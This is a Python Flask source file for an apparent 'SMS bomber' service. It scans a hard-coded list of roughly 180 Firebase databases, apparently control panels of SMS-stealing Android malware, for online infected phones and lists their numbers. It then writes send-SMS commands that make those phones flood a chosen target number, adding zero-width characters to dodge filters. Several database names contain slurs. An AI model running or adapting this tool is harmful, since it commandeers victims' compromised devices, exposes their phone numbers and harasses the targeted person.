# main.py — Vercel serverless entrypoint
# Control plane + scan + single-shot /api endpoint.
# Heavy multi-thread blasts ko VPS/Pydroid pe chala — Vercel 10s timeout maar dega.

import os
import random
import string
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MESSAGE_LIMIT   = 500
FETCH_TIMEOUT   = 5
CACHE_TTL       = 300
DEFAULT_RETRY   = 3
DEFAULT_SHOTGUN = 5
MAX_SHOTGUN     = 10
MAX_WORKERS     = 32        # Vercel-safe — 128 threads serverless pe crash karta hai
MAX_COUNT       = 50        # per-request cap on Vercel; VPS pe badha
DEFAULT_SECRET  = os.environ.get("BOMBER_SECRET", "asurpapa")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  DATABASE URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RAW_URLS = [
    # Original list
    "https://pihu-ab030-default-rtdb.firebaseio.com",
    "https://sep12-aea6d-default-rtdb.firebaseio.com",
    "https://aaaa-3bd33-default-rtdb.firebaseio.com",
    "https://gren-ff2af-default-rtdb.firebaseio.com",
    "https://hello-aae5a-default-rtdb.firebaseio.com",
    "https://baba15-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://adpanel37-default-rtdb.firebaseio.com",
    "https://jjhgj-b86e1-default-rtdb.firebaseio.com",
    "https://krijhjuiiiccyy-default-rtdb.firebaseio.com",
    "https://pakhi-dbcfb-default-rtdb.firebaseio.com",
    # Previously added
    "https://suparhirokabhay-default-rtdb.firebaseio.com",
    "https://yohichahiye-default-rtdb.firebaseio.com",
    # Asur x panel (first batch)
    "https://raj-bhai-1c1ad-default-rtdb.firebaseio.com",
    "https://raj-panel-3e09a-default-rtdb.firebaseio.com",
    "https://service-3825d-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://flash-v8enginepower-default-rtdb.firebaseio.com",
    "https://navin-9fb56-default-rtdb.firebaseio.com",
    "https://i-am-subhu-default-rtdb.firebaseio.com",
    # Asur x panel (new batch)
    "https://admin-panel-b2935-default-rtdb.firebaseio.com",
    "https://benga-7d896-default-rtdb.firebaseio.com",
    "https://mkdg-6a8f6-default-rtdb.firebaseio.com",
    "https://sagarguddu-268cb-default-rtdb.firebaseio.com",
    "https://jujuboorchodi-default-rtdb.firebaseio.com",
    "https://moneyking-47-default-rtdb.firebaseio.com",
    "https://monsterv2-cb3e1-default-rtdb.firebaseio.com",
    "https://mp-24jfg-default-rtdb.firebaseio.com",
    "https://mpariwhan-default-rtdb.firebaseio.com",
    "https://mpriwahanapn-default-rtdb.firebaseio.com",
    "https://mr-alone1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mr-prefect-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://mrtarzan2-76d17-default-rtdb.firebaseio.com",
    "https://muajob-29c86-default-rtdb.firebaseio.com",
    "https://mychandan-90095-default-rtdb.firebaseio.com",
    "https://ne-2db23-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://neha-2e45d-default-rtdb.firebaseio.com",
    "https://neon-e4ce8-default-rtdb.firebaseio.com",
    "https://newappjune-default-rtdb.firebaseio.com",
    "https://newgodx-5b008-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://newwbee-default-rtdb.firebaseio.com",
    "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://nisha-randi-default-rtdb.firebaseio.com",
    "https://nishadmumbai143-default-rtdb.firebaseio.com",
    "https://nitish-253e7-default-rtdb.firebaseio.com",
    "https://nitu-23980-default-rtdb.firebaseio.com",
    "https://njsnshdjssbb-default-rtdb.firebaseio.com",
    "https://nky0-a5870-default-rtdb.firebaseio.com",
    "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://okay-6cf67-default-rtdb.firebaseio.com",
    "https://okok-77c0d-default-rtdb.firebaseio.com",
    "https://ompanel777-default-rtdb.firebaseio.com",
    "https://ontopksns-default-rtdb.firebaseio.com",
    "https://ooop-21df8-default-rtdb.firebaseio.com",
    "https://opposite-def43-default-rtdb.firebaseio.com",
    "https://painislv-default-rtdb.firebaseio.com",
    "https://paisa-8e4f4-default-rtdb.firebaseio.com",
    "https://palms-568c7-default-rtdb.firebaseio.com",
    "https://pan3-3413e-default-rtdb.firebaseio.com",
    "https://panel-wala-v16-default-rtdb.firebaseio.com",
    "https://pankaj-sir-f9973-default-rtdb.firebaseio.com",
    "https://papi-268fa-default-rtdb.firebaseio.com",
    "https://pawan-panel-7954b-default-rtdb.firebaseio.com",
    "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "https://pintu-3f058-default-rtdb.firebaseio.com",
    "https://pm-india-07bhb-default-rtdb.firebaseio.com",
    "https://pm-india-07yg-default-rtdb.firebaseio.com",
    "https://pm-kisan-05jg-default-rtdb.firebaseio.com",
    "https://pm-kisan-111-default-rtdb.firebaseio.com",
    "https://pm-kisan-13gfh-default-rtdb.firebaseio.com",
    "https://pm-kisan-20-vgg-default-rtdb.firebaseio.com",
    "https://pm-kishan-b3-default-rtdb.firebaseio.com",
    "https://pm-kishan-b4-default-rtdb.firebaseio.com",
    "https://pm-modi-06hlhu-default-rtdb.firebaseio.com",
    "https://pm-modi-24hfh-default-rtdb.firebaseio.com",
    "https://pm49-15021-default-rtdb.firebaseio.com",
    "https://pmkal-72db3-default-rtdb.firebaseio.com",
    "https://pmnr1newad-default-rtdb.firebaseio.com",
    "https://pmsjdj-default-rtdb.firebaseio.com",
    "https://priyaknn-3e914-default-rtdb.firebaseio.com",
    "https://proffercelawte-default-rtdb.firebaseio.com",
    "https://project-1-16da0-default-rtdb.firebaseio.com",
    "https://project-f2fd6-default-rtdb.firebaseio.com",
    "https://proxy-admin-a9238-default-rtdb.firebaseio.com",
    "https://pusak-893cb-default-rtdb.firebaseio.com",
    "https://r4ndomsjdjxdxjxbcbdbdbdbdbdbbdbd-default-rtdb.firebaseio.com",
    "https://r62710898-39a8e-default-rtdb.firebaseio.com",
    "https://raaz-5287d-default-rtdb.firebaseio.com",
    "https://radline-b3986-default-rtdb.firebaseio.com",
    "https://ragav-53f3e-default-rtdb.firebaseio.com",
    "https://rahhhaa-4e5b6-default-rtdb.firebaseio.com",
    "https://rahkiu-1da83-default-rtdb.firebaseio.com",  # NEW
    "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
    "https://rahul-26832-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://rahul-8b7eb-default-rtdb.firebaseio.com",
    "https://rahul-fd65f-default-rtdb.firebaseio.com",
    "https://rahul-g11-default-rtdb.firebaseio.com",
    "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "https://raj-admin-nokia-default-rtdb.firebaseio.com",
    "https://raj-developer-7efe9-default-rtdb.firebaseio.com",
    "https://raj-parsonal-default-rtdb.firebaseio.com",
    "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com",
    "https://rajaji-8d135-default-rtdb.firebaseio.com",
    "https://rajakk-80ecd-default-rtdb.firebaseio.com",
    "https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com",
    "https://rajesh-6a67e-default-rtdb.firebaseio.com",
    "https://rajj-9c74b-default-rtdb.firebaseio.com",
    "https://rajkumar-5af9d-default-rtdb.firebaseio.com",
    "https://rajkumar-a67fb-default-rtdb.firebaseio.com",
    "https://rajputlodu-5bed0-default-rtdb.firebaseio.com",
    "https://raki143aa-default-rtdb.firebaseio.com",
    "https://ramjidost-default-rtdb.firebaseio.com",
    "https://ramm-bac59-default-rtdb.firebaseio.com",
    "https://ramu-c81a7-default-rtdb.firebaseio.com",
    "https://rancho-72506-default-rtdb.firebaseio.com",
    "https://randi-a1d3f-default-rtdb.firebaseio.com",
    "https://randi2-8d962-default-rtdb.firebaseio.com",
    "https://randipelega-default-rtdb.firebaseio.com",
    "https://rantaishita-f7614-default-rtdb.firebaseio.com",
    "https://ravan-id-default-rtdb.firebaseio.com",
    "https://ravi-23776-default-rtdb.firebaseio.com",
    "https://ravikumar-1b0b8-default-rtdb.firebaseio.com",
    "https://anvith6-9450e-default-rtdb.firebaseio.com",
    "https://apkdriod-default-rtdb.firebaseio.com",
    "https://apkdriod-f6fb9-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com",
    "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "https://arjun-singh-43d2f-default-rtdb.firebaseio.com",
    "https://arvind-c5b03-default-rtdb.firebaseio.com",
    "https://arvind90-default-rtdb.firebaseio.com",
    "https://asdtest-project-default-rtdb.firebaseio.com",
    "https://asif-2a927-default-rtdb.firebaseio.com",
    "https://asif-alam991-default-rtdb.firebaseio.com",
    "https://asifpersnolyellow-default-rtdb.firebaseio.com",
    "https://asop-8630f-default-rtdb.firebaseio.com",
    "https://asry-84be8-default-rtdb.firebaseio.com",
    "https://astha-rani80-default-rtdb.firebaseio.com",
    "https://astra-b23a1-default-rtdb.firebaseio.com",
    "https://atifbhadu-bd0d2-default-rtdb.firebaseio.com",
    "https://atiffriestpanel-default-rtdb.firebaseio.com",
    "https://atifheree-default-rtdb.firebaseio.com",
    "https://atifkaprojech-default-rtdb.firebaseio.com",
    "https://atifkimgofindia-default-rtdb.firebaseio.com",
    "https://atifking65-d9837-default-rtdb.firebaseio.com",
    "https://atifold-d560e-default-rtdb.firebaseio.com",
    "https://aujla-afe1a-default-rtdb.firebaseio.com",
    "https://axayyyyyy-default-rtdb.firebaseio.com",
    "https://ayan-5581d-default-rtdb.firebaseio.com",
    "https://baba-tillu-2-default-rtdb.firebaseio.com",
    "https://bandhan2-7jan-default-rtdb.firebaseio.com",
    "https://bank-e-kyc-default-rtdb.firebaseio.com",
    "https://bega-8457c-default-rtdb.firebaseio.com",
    "https://betagopi-default-rtdb.firebaseio.com",
    "https://bhaiyasumm-default-rtdb.firebaseio.com",
    "https://bholababa-default-rtdb.firebaseio.com",
    "https://bholanitish-73c07-default-rtdb.firebaseio.com",
    "https://biharnew2-default-rtdb.firebaseio.com",
    "https://billojii-default-rtdb.firebaseio.com",
    "https://bishnu-a0e01-default-rtdb.firebaseio.com",
    "https://bkc57-6d601-default-rtdb.firebaseio.com",
    "https://bookfjk-246b2-default-rtdb.firebaseio.com",
    "https://bossuun-default-rtdb.firebaseio.com",
    "https://bsjshd-7e1bf-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "https://bunty-51bcc-default-rtdb.firebaseio.com",
    "https://burchanno-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "https://carderpanel-default-rtdb.firebaseio.com",
    "https://care-supoorts-default-rtdb.firebaseio.com",
    "https://ccsnshbnczc-default-rtdb.firebaseio.com",
    "https://challan5-default-rtdb.firebaseio.com",
    "https://chalo-a536a-default-rtdb.firebaseio.com",
]
DATABASE_URLS = list(dict.fromkeys(RAW_URLS))
ZW_CHARS = ['\u200b', '\u200c', '\u200d', '\u2060', '\ufeff']


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def gen_random_key():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(8))


def fb_fetch(db_url, path, user_key, extra=None):
    full = db_url.rstrip('/') + '/' + path + '.json'
    key = (user_key or '').strip() or gen_random_key()
    params = {'auth': key, 'orderBy': '"$key"', 'limitToLast': str(MESSAGE_LIMIT)}
    if extra:
        params.update(extra)
    try:
        r = requests.get(full, params=params, timeout=FETCH_TIMEOUT,
                         headers={'Accept': 'application/json'})
    except requests.RequestException as e:
        raise RuntimeError(f'NET: {e}')
    if r.status_code in (401, 403):
        raise RuntimeError('PERMISSION_DENIED')
    if r.status_code == 404:
        return None
    if not r.ok:
        raise RuntimeError(f'HTTP {r.status_code}')
    return r.json()


def fb_put(db_url, path, user_key, data):
    full = db_url.rstrip('/') + '/' + path + '.json'
    key = (user_key or '').strip() or gen_random_key()
    try:
        r = requests.put(full, params={'auth': key}, json=data,
                         timeout=FETCH_TIMEOUT,
                         headers={'Content-Type': 'application/json'})
    except requests.RequestException as e:
        raise RuntimeError(f'NET: {e}')
    if r.status_code in (401, 403):
        raise RuntimeError('PERMISSION_DENIED')
    if not r.ok:
        raise RuntimeError(f'HTTP {r.status_code}')
    return r.json() if r.text else {}


def parse_clients(data):
    out = []
    if not isinstance(data, dict):
        return out
    for cid, val in data.items():
        if not isinstance(val, dict):
            continue
        out.append({
            'id': cid,
            'status': bool(val.get('status')),
            'phone': str(val.get('mobNo') or val.get('phone') or val.get('mobile')
                         or val.get('phoneNumber') or val.get('number') or ''),
        })
    return out


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  DEVICE CACHE  (per-invocation only on Vercel)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_cache_lock = threading.Lock()
_device_cache = []
_cache_time = 0.0


def get_online_devices(secret, force_refresh=False):
    global _device_cache, _cache_time
    now = time.time()
    with _cache_lock:
        if not force_refresh and _device_cache and (now - _cache_time) < CACHE_TTL:
            return list(_device_cache)

    results = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(scan_one_db, url, secret): url for url in DATABASE_URLS}
        for fut in as_completed(futures):
            try:
                results.extend(fut.result())
            except Exception:
                pass

    random.shuffle(results)
    with _cache_lock:
        _device_cache = results
        _cache_time = time.time()
    return list(results)


def scan_one_db(db_url, secret):
    try:
        data = fb_fetch(db_url, 'clients', secret)
    except Exception:
        return []
    if not data:
        return []
    return [{**c, 'dbUrl': db_url} for c in parse_clients(data) if c['status']]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ROUTES
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@app.route('/')
def index():
    return jsonify({
        'ok': True,
        'name': 'PRIM Bomber API (Vercel control plane)',
        'dbs': len(DATABASE_URLS),
        'runtime': 'serverless — per-request cache only',
        'caps': {'max_count': MAX_COUNT, 'max_workers': MAX_WORKERS},
        'defaults': {'retry': DEFAULT_RETRY, 'shotgun': DEFAULT_SHOTGUN},
        'endpoints': {
            'bomb': '/api?count=10&msg=hlo&number=91XXXXXXXXXXX',
            'scan': '/api/scan',
            'health': '/api/health',
            'devices': '/api/devices'
        }
    })


@app.route('/api')
def api_bomb():
    t0 = time.time()
    try:
        count = int(request.args.get('count', 1))
    except ValueError:
        count = 1
    count = max(1, min(count, MAX_COUNT))

    msg = (request.args.get('msg') or '').strip()
    number = ''.join(ch for ch in (request.args.get('number') or '') if ch.isdigit())
    secret = (request.args.get('key') or DEFAULT_SECRET or '').strip()

    try:
        retry = int(request.args.get('retry', DEFAULT_RETRY))
    except ValueError:
        retry = DEFAULT_RETRY
    retry = max(1, min(retry, 10))

    try:
        shotgun = int(request.args.get('shotgun', DEFAULT_SHOTGUN))
    except ValueError:
        shotgun = DEFAULT_SHOTGUN
    shotgun = max(1, min(shotgun, MAX_SHOTGUN))

    if not msg:
        return jsonify({'ok': False, 'error': 'msg required'}), 400
    if len(number) < 10 or len(number) > 15:
        return jsonify({'ok': False, 'error': 'invalid number (10-15 digits)'}), 400
    if not secret:
        return jsonify({'ok': False, 'error': 'key required — set BOMBER_SECRET env or pass &key='}), 400

    devices = get_online_devices(secret)
    if not devices:
        return jsonify({'ok': False, 'error': 'no online devices found'}), 503

    n_devices = len(devices)
    random.shuffle(devices)

    counters = {'sent': 0, 'failed': 0, 'attempts': 0}
    lock = threading.Lock()
    device_pool = list(devices)
    pool_lock = threading.Lock()

    def pick_device():
        with pool_lock:
            if not device_pool:
                device_pool.extend(devices)
            return random.choice(device_pool)

    def fire_one(device):
        zw = random.choice(ZW_CHARS)
        payload = {'from': 1, 'to': number, 'message': msg + zw, 'isSended': False}
        path = f"clients/{device['id']}/webhookEvent/sendSms"
        try:
            fb_put(device['dbUrl'], path, secret, payload)
            with lock:
                counters['sent'] += 1
            return True
        except Exception:
            with lock:
                counters['failed'] += 1
            return False

    def worker(_slot):
        picked = [pick_device() for _ in range(shotgun)]
        with lock:
            counters['attempts'] += len(picked)
        with ThreadPoolExecutor(max_workers=len(picked)) as ex:
            results = list(ex.map(fire_one, picked))
        if not any(results):
            for _ in range(retry - 1):
                d = pick_device()
                with lock:
                    counters['attempts'] += 1
                if fire_one(d):
                    break

    workers = min(count, n_devices, MAX_WORKERS)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(worker, range(count)))

    return jsonify({
        'ok': True,
        'number': number,
        'msg': msg,
        'requested': count,
        'sent': counters['sent'],
        'failed': counters['failed'],
        'attempts': counters['attempts'],
        'devicesAvailable': n_devices,
        'retryPerRequest': retry,
        'shotgunPerRequest': shotgun,
        'elapsedSec': round(time.time() - t0, 2),
          })


@app.route('/api/scan')
def api_scan():
    secret = (request.args.get('key') or DEFAULT_SECRET or '').strip()
    if not secret:
        return jsonify({'ok': False, 'error': 'key required'}), 400
    t0 = time.time()
    devices = get_online_devices(secret, force_refresh=True)
    return jsonify({
        'ok': True,
        'count': len(devices),
        'elapsedSec': round(time.time() - t0, 2),
        'devices': [{'id': d['id'], 'phone': d['phone'], 'db': d['dbUrl']} for d in devices]
    })


@app.route('/api/health')
def api_health():
    return jsonify({
        'ok': True,
        'dbs': len(DATABASE_URLS),
        'cachedDevices': len(_device_cache),
        'cacheAgeSec': int(time.time() - _cache_time) if _cache_time else 0,
        'config': {
            'max_count': MAX_COUNT,
            'max_workers': MAX_WORKERS,
            'default_retry': DEFAULT_RETRY,
            'default_shotgun': DEFAULT_SHOTGUN
        }
    })


@app.route('/api/devices')
def api_devices():
    return jsonify({
        'ok': True,
        'count': len(_device_cache),
        'devices': [{'id': d['id'], 'phone': d['phone'], 'db': d['dbUrl']} for d in _device_cache]
    })


# Vercel WSGI entrypoint — app.run() nahi, yeh callable mount hota hai
# local test ke liye: python main.py
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f'[PRIM] local dev on :{port}')
    app.run(host='0.0.0.0', port=port, threaded=True, debug=False)